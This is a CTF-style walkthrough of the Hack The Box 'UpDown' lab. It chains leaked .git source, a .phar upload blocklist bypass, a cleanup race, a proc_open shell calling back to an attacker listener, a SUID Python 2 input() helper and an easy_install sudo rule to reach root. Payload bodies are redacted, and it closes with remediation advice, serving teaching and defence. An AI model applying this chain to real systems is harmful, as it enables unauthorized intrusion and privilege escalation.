---
title: "UpDown — Exposed Git Metadata, Upload Race, and Privileged Interpreter Abuse"
description: "Exposed version-control metadata and a custom-header development virtual host lead to an upload blocklist bypass and a race condition for a web-service shell; a SUID Python 2 input() helper and a package-installer sudo rule reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - git
  - race-condition
  - suid
  - python
objective: "Escalate from exposed version-control metadata and an upload race to web-service code execution, then to application-user and root access through a SUID Python 2 helper and an over-broad package-installer sudo rule."
tools:
  - rustscan
  - feroxbuster
  - git-dumper
  - gobuster
  - curl
  - netcat
  - python3
  - ssh
  - easy_install
skill: "Chaining web-source exposure, an upload race, and unsafe privileged interpreter patterns to root"
outcome: "Web-service shell via a `proc_open` payload, application-user access via the SUID Python 2 `input()` helper, and root via the `easy_install` sudo rule"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux (Ubuntu); Apache 2.4.41 and a PHP availability checker |
| Starting position | Unauthenticated network access |
| Objective | Escalate from exposed version-control metadata and an upload race to web-service code execution, then to application-user and root access |
| Outcome | Web-service shell, application-user access via the SUID Python 2 helper, and root via the `easy_install` sudo rule |

## Exposed git to SUID interpreter root

UpDown is a Medium-rated Hack The Box Linux lab built around a website availability checker. The path opens with an exposed Git directory that leaks the development source and its weak header-based access control, continues through a `.phar` upload that bypasses an extension blocklist and races the checker's delayed cleanup, and finishes with a SUID Python 2 `input()` helper and an over-broad `easy_install` sudo rule. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves the command syntax. See [how evidence is handled](/method/).

**Attack path:** **Exposed `.git` metadata → header-gated development vhost → `.phar` upload blocklist bypass → delayed-cleanup race → `proc_open` web-service shell → SUID Python 2 `input()` → application-user access → `NOPASSWD` `easy_install` sudo → root**

## Ubuntu Apache availability checker, web access to root

- **Target:** an Ubuntu host exposing an Apache web server (port 80) and OpenSSH (port 22).
- **Application:** a PHP website availability checker that accepts a list of URLs and reports whether each is reachable.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from web enumeration to code execution, then to a user-level shell and root by abusing the application's upload handling and privileged local components.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: git metadata, upload race, and easy_install

### 1. Enumeration and Exposed Version-Control Metadata

Observation: the initial attack surface is small (SSH and Apache), and directory brute-forcing exposes a development path and its version-control metadata.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/UpDown-TCP
```

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
```

```bash
feroxbuster --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox.result
```

```text
301  GET  http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>      => http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/
301  GET  http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA> => http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA>/
```

I dumped the exposed repository locally, and the recovered `.htaccess` gated the development area behind a static header:

```bash
git-dumper http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA>/ git
```

```apache
SetEnvIfNoCase <DEVELOPMENT_HEADER> "<DEVELOPMENT_HEADER_VALUE>" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Significance: a served Git directory exposes full application source, and header-based gating is weak access control: anyone who recovers or guesses the values reaches the protected development application.

Result: the development source is recovered, and access to it depends on a single static request header.

### 2. Development Virtual Host

Observation: the main host exposes no development panel, so hostname enumeration targets a second virtual host.

```bash
gobuster vhost --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

```text
<DEVELOPMENT_VHOST> Status: 403 [Size: 281]
```

```bash
curl -i -H '<DEVELOPMENT_HEADER>: <DEVELOPMENT_HEADER_VALUE>' http://<DEVELOPMENT_VHOST>/
```

The source records the development checker loading once the header was supplied; the `403` above is the only captured output for this transition. With the header applied, the virtual host exposes a development version of the checker that accepts an uploaded list of URLs, and content discovery finds a browsable `/uploads/` directory.

Significance: the protected application accepts uploads, and its reachability depends on a header value leaked in source.

Result: the development upload interface and a browsable upload directory are identified.

### 3. Source Review: Upload Path, Blocklist, and Cleanup

Observation: the leaked PHP source defines an upload handler with three exploitable properties.

Predictable destination and delayed cleanup:

```php
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){ mkdir($dir, 0770, true); }
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

```php
@unlink($final_path);
```

Extension filter (blocklist):

```php
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
    die("Extension not allowed!");
}
```

Significance: `md5(time())` produces a guessable directory name; the blocklist omits `.phar`, which this target's PHP still interprets as executable; and because the file is deleted only after the URL check completes, a stalled check leaves the upload on disk.

Result: a payload format (`.phar`), a guessable path, and a race window are all identified from source.

### 4. Initial Access: Upload Race and `proc_open`

Observation: the checker fetches every supplied URL, so pointing it at a controlled listener stalls the request and delays cleanup.

Action: I kept a connection open while the `.phar` was uploaded.

```bash
nc -lvnp <LISTENER_PORT>
```

The uploaded file carried executable PHP followed by a parser-stop marker so the trailing fetch URL parsed as plain text rather than code:

```text
<?php <CODE>; __halt_compiler(); ?>
http://<ATTACKER_HOST>:<LISTENER_PORT>
```

```text
http://<DEVELOPMENT_VHOST>/<UPLOAD_PATH>/<PREDICTABLE_DIRECTORY>/<UPLOADED_FILE>
```

`phpinfo()` confirmed code execution and revealed that common execution functions are disabled:

```text
disable_functions:
..., system, exec, shell_exec, popen, passthru, ..., fsockopen
```

`proc_open` was not disabled. A second `.phar` using it was uploaded the same way.

```text
connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>]
<WEB_SERVICE_ACCOUNT>@<TARGET_HOST>:<WEBROOT>$
```

```text
uid=<WEB_SERVICE_UID>(<WEB_SERVICE_ACCOUNT>) gid=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>) groups=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>)
```

Significance: an incomplete extension blocklist plus a delayed-cleanup race converts a file upload into PHP execution, and `disable_functions` coverage gaps leave `proc_open` available for process creation.

Result: command execution as the web-service account is obtained and confirmed.

### 5. Privilege Escalation: SUID Python 2 Helper

Observation: an application-user home directory contains a SUID binary and its Python source, executable by the web-service group.

```bash
ls -la /home/<APPLICATION_USER>/<SUID_HELPER_DIR>
```

```text
-rwsr-x--- 1 <APPLICATION_USER> <WEB_SERVICE_ACCOUNT> 16928 <SUID_HELPER>
-rwxr-x--- 1 <APPLICATION_USER> <WEB_SERVICE_ACCOUNT>   154 <SUID_HELPER>_test.py
```

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
    print "Website is up"
else:
    print "Website is down"
```

Significance: the `print "..."` syntax confirms Python 2, where `input()` evaluates its argument as Python code. Combined with the SUID bit, the helper executes attacker-supplied Python in the application-user context.

Action: run the helper and supply a Python expression as the "URL" input. The source records the resulting shell as an awkward, non-interactive context, so this transition is narrative-only: no output from the helper itself was captured, and I could not verify the shell directly.

```bash
./<SUID_HELPER>
```

An SSH private key readable in the application-user context was then used for a stable session:

```bash
ssh -i <KEY_FILE> <APPLICATION_USER>@<TARGET_DOMAIN>
```

```text
uid=<APPLICATION_USER_UID>(<APPLICATION_USER>) gid=<APPLICATION_USER_GID>(<APPLICATION_USER>) groups=<APPLICATION_USER_GID>(<APPLICATION_USER>)
```

Significance: a SUID wrapper around an interpreter turns ordinary input handling into a privilege boundary, and the recovered key converts transient code execution into a reusable login.

Result: an application-user shell is obtained and confirmed.

### 6. Root: Package-Installer Sudo Rule

Observation: the application-user account holds an unrestricted `NOPASSWD` sudo rule for a package installer.

```bash
sudo -l
```

```text
User <APPLICATION_USER> may run the following commands on <TARGET_HOST>:
    (ALL) NOPASSWD: <PACKAGE_INSTALLER_PATH>
```

Significance: the legacy Python package installer processes and executes package setup logic, so permitting it through sudo is equivalent to permitting arbitrary Python execution as root.

Action: I prepared a local package whose `setup.py` spawns a shell.

```bash
sudo <PACKAGE_INSTALLER_PATH> <LOCAL_PACKAGE_PATH>
```

```text
whoami
root
```

Significance: allowing a build/install utility that executes project-controlled code through sudo grants root to any user who can reach it.

Result: a root shell is obtained and confirmed.

## The delayed-cleanup race window

- **Race-condition timing:** the uploaded file was deleted only after the URL check completed, so I stalled the outbound check against a controlled listener to hold the upload reachable long enough to be used.

## Outcome: web shell, SUID interpreter, and easy_install root

The recorded path runs from a web-service shell through the `.phar` upload and delayed-cleanup race to application-user access through the SUID Python 2 `input()` helper, then to root through the `NOPASSWD` `easy_install` rule. The helper's resulting shell ran in an awkward, non-interactive context, so its success is corroborated by the subsequent SSH session rather than by captured output.

## Recommendations: git metadata, upload blocklist, race window, SUID, and easy_install

1. **Served version-control metadata and static header gates.** Serving `.git` disclosed full source and the header value that protected the development area. *Recommendation:* never serve version-control directories, keep development virtual hosts off the public surface, and replace static-header gating with real authentication and authorization.
2. **Blocklist-based upload validation with predictable storage.** The handler blocked known-dangerous extensions but missed `.phar`, and stored uploads under guessable `md5(time())` directories. *Recommendation:* validate uploads against an explicit allowlist of extensions and MIME types, store files outside the web root under cryptographically random names, and serve them through a download handler rather than executing them.
3. **Delayed cleanup creating a race window.** Deleting the upload only after the URL check left it momentarily reachable. *Recommendation:* delete temporary uploads immediately and avoid performing outbound requests that an uploader can stall while an executable file remains web-accessible.
4. **SUID wrapper around an interpreter.** The helper ran Python 2 `input()` under a SUID bit, so supplied text was executed with the application user's privileges. *Recommendation:* never place SUID on interpreters or script wrappers; design privileged helpers as small, audited programs exposing fixed operations only, and treat readable private keys as a credential-exposure finding.
5. **Over-broad `NOPASSWD` sudo rule for a package installer.** Allowing `easy_install` let a user execute project-controlled `setup.py` as root. *Recommendation:* audit `NOPASSWD` entries against known abuse paths, avoid granting package managers and build tools through sudo, and restrict privileged installs to fixed sources and arguments.

## References

- [Hack The Box — UpDown](https://app.hackthebox.com/machines/UpDown) (retired machine)
- [RustScan](https://github.com/RustScan/RustScan)
- [feroxbuster](https://github.com/epi052/feroxbuster)
- [git-dumper](https://github.com/arthaud/git-dumper)
- [Gobuster](https://github.com/OJ/gobuster)
- [curl — command line tool and library manual](https://curl.se/docs/manpage.html)
- [Apache HTTP Server 2.4 Documentation](https://httpd.apache.org/docs/2.4/)
- [Python 2 — `input()` built-in function](https://docs.python.org/2/library/functions.html#input)
- [PHP — `proc_open`](https://www.php.net/manual/en/function.proc-open.php)
- [PHP — `disable_functions` directive](https://www.php.net/manual/en/ini.core.php#ini.disable-functions)
- [setuptools — `easy_install` (deprecated)](https://setuptools.pypa.io/en/latest/deprecated/easy_install.html)
- [GTFOBins — `easy_install`](https://gtfobins.github.io/gtfobins/easy_install/)
- [OpenSSH manuals](https://www.openssh.com/manual.html)
